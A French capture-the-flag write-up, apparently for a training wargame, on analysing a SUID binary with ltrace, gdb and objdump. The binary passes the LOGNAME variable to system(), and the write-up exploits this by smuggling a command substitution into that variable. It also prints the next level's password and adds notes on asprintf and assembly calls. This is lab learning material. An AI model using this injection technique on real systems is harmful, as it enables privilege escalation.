LEVEL 07

------------------------------------------------------------------------------------------------------------------------

    find . -user level07 2> /dev/null | grep -v proc
                 flag07
    find . -perm /u=s,g=s

    find . -type f -user flag07 -o -user level07
    find . -maxdepth 1 -name "*string*" -print


* Recherches

    Un executable SUID flag07 que l'on peut cette fois ci analyser avec gdb

    ltrace ./level07

        Intéressant : getenv("LOGNAME")                                     = "level07"
                      system("/bin/echo level07 "level07
                    
                      Si on run : export LOGNAME=flag07, l'output change bien, en flag07

    objdump -d level07 | awk -F"\n" -v RS="\n\n" '$1 ~ /<main>/'


    24 lignes de codes :

        (gdb) b 24
        Breakpoint 5 at 0x804859f: file /home/user/level07/level07.c, line 24.
        (gdb) b 25
        No line 25 in the current file.
        Make breakpoint pending on future shared library load? (y or [n])

    Ligne juste avant call asprintf : 22 donc b 22
    Ligne juste avant call system : 23 donc b 23

    Pas + de recherches, en faisant du testing à la volée c'est finalement passé ^^' plutôt gentil ce level

* Solution

    En résumé, on a un binaire SUID flag07
    ltrace ./level07
    objdump -d level07 | awk -F"\n" -v RS="\n\n" '$1 ~ /<main>/'

    En assembleur, on constate qu'il y a un call de la fameuse fonction system()
    Ce call est basé sur le retour de l'appel de asprintf
    Asprintf est un printf qui renvoie une chaine allouée de ce qui est print (+ safe ainsi), en l'occurence, est print la var d'env $LOGNAME

    Donc en tréfouillant un peu, on arrive à ceci :

    export LOGNAME='$(getflag)' ; ./level07

    su level08 fiumuikeil55xe9cu4dood66h



------------------------------------------------------------------------------------------------------------------------

int asprintf(char **strp, const char *fmt, ...);

asprintf : elle alloue une chaîne de caractères de taille suffisante pour contenir la sortie, y compris l'octet NULL terminal et renvoient un pointeur vers cette chaîne via le premier paramètre
asprintf() does this in one step for you - calculates the length of the string, allocates that amount of memory, and writes the string into it.
https://stackoverflow.com/a/12747131

ASPRINTF vs others print ? The benefit is security.
Numerous programs have allowed system exploits to occur by having programmer-supplied buffers overflowed when filled with user supplied data.
Having asprintf allocate the buffer for you guarantees that can't happen.
However you must check the return value of asprintf to ensure that the memory allocation actually succeeded.

http://manpagesfr.free.fr/man/man3/asprintf.3.html


• NASM

The call instruction is pushing the return address onto the stack
You can access your parameter by using some arithmetic and esp

push 0       ; fourth parameter
push 4       ; third parameter
push 4       ; second parameter
push [eax]   ; first parameter
call printf  ; somefunction(first,second,third,fourth);

https://www.commentcamarche.net/contents/20-les-procedures-en-assembleur
https://www.gladir.com/LEXIQUE/ASM/call.htm
